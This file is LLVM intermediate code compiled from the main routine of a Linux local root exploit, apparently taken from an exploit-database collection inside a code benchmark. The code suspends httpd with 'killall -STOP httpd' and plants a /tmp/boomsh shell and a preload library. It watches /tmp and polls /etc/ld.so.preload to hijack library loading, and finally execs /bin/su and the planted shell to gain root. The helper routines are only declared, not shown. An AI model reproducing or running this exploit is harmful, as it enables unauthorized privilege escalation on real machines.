; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21667.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21667.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64, i64 }

@.str = private unnamed_addr constant [12 x i8] c"/tmp/boomsh\00", align 1
@__const.main.boomsh = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i32 0, i32 0), i8* null], align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@__const.main.suid = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"killall -STOP httpd\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@O_DIRECTORY = common dso_local global i32 0, align 4
@F_SETSIG = common dso_local global i32 0, align 4
@SIGUSR1 = common dso_local global i32 0, align 4
@F_NOTIFY = common dso_local global i32 0, align 4
@DN_MODIFY = common dso_local global i32 0, align 4
@DN_DELETE = common dso_local global i32 0, align 4
@DN_RENAME = common dso_local global i32 0, align 4
@DN_ATTRIB = common dso_local global i32 0, align 4
@DN_CREATE = common dso_local global i32 0, align 4
@DN_MULTISHOT = common dso_local global i32 0, align 4
@DN_ACCESS = common dso_local global i32 0, align 4
@sig_x = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [55 x i8] c"Installed signal-handler. Waiting for apache restart.\0A\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"/etc/ld.so.preload\00", align 1
@environ = external dso_local global i8**, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.stat, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [2 x i8*], align 16
  %10 = alloca [2 x i8*], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %8, align 8
  %11 = bitcast [2 x i8*]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 bitcast ([2 x i8*]* @__const.main.boomsh to i8*), i64 16, i1 false)
  %12 = bitcast [2 x i8*]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 bitcast ([2 x i8*]* @__const.main.suid to i8*), i64 16, i1 false)
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 2
  br i1 %14, label %15, label %17

15:                                               ; preds = %2
  %16 = call i32 (...) @usage()
  br label %17

17:                                               ; preds = %15, %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i8* @strdup(i8* %20)
  store i8* %21, i8** %8, align 8
  %22 = load i32, i32* @stdout, align 4
  %23 = call i32 @setbuffer(i32 %22, i32* null, i32 0)
  %24 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %25 = call i32 (...) @create_boomsh()
  %26 = call i32 (...) @create_boomso()
  %27 = load i32, i32* @O_RDONLY, align 4
  %28 = load i32, i32* @O_DIRECTORY, align 4
  %29 = or i32 %27, %28
  %30 = call i32 @open(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 %29)
  store i32 %30, i32* %6, align 4
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %32, label %33

32:                                               ; preds = %17
  store i32 -1, i32* %3, align 4
  br label %106

33:                                               ; preds = %17
  %34 = load i32, i32* %6, align 4
  %35 = load i32, i32* @F_SETSIG, align 4
  %36 = load i32, i32* @SIGUSR1, align 4
  %37 = call i64 @fcntl(i32 %34, i32 %35, i32 %36)
  %38 = icmp slt i64 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %33
  store i32 -1, i32* %3, align 4
  br label %106

40:                                               ; preds = %33
  %41 = load i32, i32* %6, align 4
  %42 = load i32, i32* @F_NOTIFY, align 4
  %43 = load i32, i32* @DN_MODIFY, align 4
  %44 = load i32, i32* @DN_DELETE, align 4
  %45 = or i32 %43, %44
  %46 = load i32, i32* @DN_RENAME, align 4
  %47 = or i32 %45, %46
  %48 = load i32, i32* @DN_ATTRIB, align 4
  %49 = or i32 %47, %48
  %50 = load i32, i32* @DN_CREATE, align 4
  %51 = or i32 %49, %50
  %52 = load i32, i32* @DN_MULTISHOT, align 4
  %53 = or i32 %51, %52
  %54 = load i32, i32* @DN_ACCESS, align 4
  %55 = or i32 %53, %54
  %56 = call i64 @fcntl(i32 %41, i32 %42, i32 %55)
  %57 = icmp slt i64 %56, 0
  br i1 %57, label %58, label %59

58:                                               ; preds = %40
  store i32 -1, i32* %3, align 4
  br label %106

59:                                               ; preds = %40
  %60 = load i32, i32* @SIGUSR1, align 4
  %61 = load i32, i32* @sig_x, align 4
  %62 = call i32 @signal(i32 %60, i32 %61)
  %63 = call i32 @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.4, i64 0, i64 0))
  br label %64

64:                                               ; preds = %67, %59
  %65 = call i64 @stat(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), %struct.stat* %7)
  %66 = icmp slt i64 %65, 0
  br i1 %66, label %67, label %69

67:                                               ; preds = %64
  %68 = call i32 @sleep(i32 1)
  br label %64

69:                                               ; preds = %64
  %70 = call i32 (...) @scan_proc()
  %71 = load i8*, i8** %8, align 8
  %72 = call i32 @trigger_cgi(i8* %71)
  br label %73

73:                                               ; preds = %89, %69
  %74 = call i32 @sleep(i32 1)
  %75 = call i32 @memset(%struct.stat* %7, i32 0, i32 16)
  %76 = call i64 @stat(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), %struct.stat* %7)
  %77 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 0
  %78 = load i64, i64* %77, align 8
  %79 = icmp sgt i64 %78, 0
  br i1 %79, label %80, label %81

80:                                               ; preds = %73
  br label %90

81:                                               ; preds = %73
  %82 = call i64 @stat(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), %struct.stat* %7)
  %83 = icmp eq i64 %82, 0
  br i1 %83, label %84, label %89

84:                                               ; preds = %81
  %85 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 1
  %86 = load i64, i64* %85, align 8
  %87 = icmp eq i64 %86, 0
  br i1 %87, label %88, label %89

88:                                               ; preds = %84
  br label %90

89:                                               ; preds = %84, %81
  br label %73

90:                                               ; preds = %88, %80
  %91 = call i64 (...) @fork()
  %92 = icmp eq i64 %91, 0
  br i1 %92, label %93, label %99

93:                                               ; preds = %90
  %94 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %95 = load i8*, i8** %94, align 16
  %96 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %97 = call i32 @execve(i8* %95, i8** %96, i8** null)
  %98 = call i32 @exit(i32 1) #4
  unreachable

99:                                               ; preds = %90
  %100 = call i32 @sleep(i32 3)
  %101 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  %102 = load i8*, i8** %101, align 16
  %103 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  %104 = load i8**, i8*** @environ, align 8
  %105 = call i32 @execve(i8* %102, i8** %103, i8** %104)
  store i32 0, i32* %3, align 4
  br label %106

106:                                              ; preds = %99, %58, %39, %32
  %107 = load i32, i32* %3, align 4
  ret i32 %107
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @usage(...) #2

declare dso_local i8* @strdup(i8*) #2

declare dso_local i32 @setbuffer(i32, i32*, i32) #2

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @create_boomsh(...) #2

declare dso_local i32 @create_boomso(...) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i64 @fcntl(i32, i32, i32) #2

declare dso_local i32 @signal(i32, i32) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i64 @stat(i8*, %struct.stat*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @scan_proc(...) #2

declare dso_local i32 @trigger_cgi(i8*) #2

declare dso_local i32 @memset(%struct.stat*, i32, i32) #2

declare dso_local i64 @fork(...) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
